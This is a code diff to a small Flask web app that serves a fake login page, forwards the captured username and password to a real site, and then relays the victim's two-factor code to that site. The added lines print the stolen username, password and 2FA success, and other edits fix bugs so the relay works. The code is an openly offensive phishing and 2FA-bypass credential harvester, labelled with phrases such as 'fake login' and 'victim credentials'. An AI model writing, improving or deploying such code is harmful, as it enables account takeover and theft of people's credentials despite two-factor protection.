@@ -16,6 +16,7 @@ Session(app)
 
 @app.get("/")
 def index_get():
+    print("Serving fake login.")
     return render_template("login.html")
 
 
@@ -25,13 +26,17 @@ def index_post():
     password = str(request.values.get("pass"))
 
     # Try to login to actual site
-    values = {'username': username,
-              'password': password}
+    values = {'user': username,
+              'pass': password}
 
     r = requests.post(url_actual, data=values)
 
-    if "Denied" in r.content:
+    if "Denied" in r.content.decode():
         return render_template("loginfail.html")
+
+    print("Successfully logged in using victim credentials.")
+    print("Username was: " + username)
+    print("Password was: " + password)
 
     return render_template("twofactor.html")
 
@@ -45,9 +50,9 @@ def twofactor_post():
 
     r = requests.post(url_actual + "/twofactor", data=values)
 
-    if "Denied" in r.content:
+    if "Denied" in r.content.decode():
         return render_template("twofactorfail.html")
-
+    print("Successfully authenticated using victim 2FA code.")
     return render_template("success.html")
 
 
